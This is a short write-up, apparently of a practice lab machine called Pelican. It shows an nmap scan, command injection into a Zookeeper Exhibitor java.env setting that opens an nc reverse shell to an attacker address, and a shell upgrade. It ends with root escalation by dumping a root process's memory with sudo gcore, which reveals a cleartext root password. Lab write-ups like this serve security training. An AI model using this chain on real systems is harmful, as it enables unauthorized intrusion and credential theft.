```
nmap -sC -sV -p- 192.168.169.98  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 17:23 CDT
Nmap scan report for 192.168.169.98
Host is up (0.045s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-title: Forbidden - CUPS v2.2.10
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8e16068bef58e707054b427ee9a7e7f (RSA)
|   256 bb999a453f350bb349e6cf1149878d94 (ECDSA)
|_  256 f2ebfc45d7e9807766a39353de00579c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(1.0)
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.169.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
44091/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-07-20T22:24:26
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2023-07-20T18:24:27-04:00
|_clock-skew: mean: 1h20m28s, deviation: 2h18m34s, median: 27s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.65 seconds
                                                              
```

https://kashz.gitbook.io/kashz-jewels/services/zookeeper-exhibitor

```
add to java.env script: $(nc -e /bin/bash 192.168.45.216 445 &)
```

Caught a reverse shell on port 445.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

Found GTFO bins which explains it cannot drop the permissions or escape so you need to find a process to dump information.

https://gtfobins.github.io/gtfobins/gcore/


```
root       493  0.0  0.0   2276    72 ?        Ss   18:21   0:00 /usr/bin/passwo


charles@pelican:/tmp$ sudo gcore 493

charles@pelican:/tmp$ strings core.493

001 Password: root:
ClogKingpinInning731
```

Root password was mentioned and I logged in as root.